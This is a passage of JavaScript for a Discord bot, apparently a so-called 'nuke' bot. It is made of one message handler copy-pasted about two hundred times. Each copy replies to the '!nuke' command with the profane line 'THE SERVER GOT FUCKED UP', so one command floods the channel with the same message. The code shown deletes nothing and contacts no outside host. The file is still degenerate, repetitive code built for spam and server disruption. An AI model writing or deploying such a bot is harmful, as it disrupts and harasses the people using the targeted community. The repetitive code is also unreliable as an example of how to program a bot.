        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
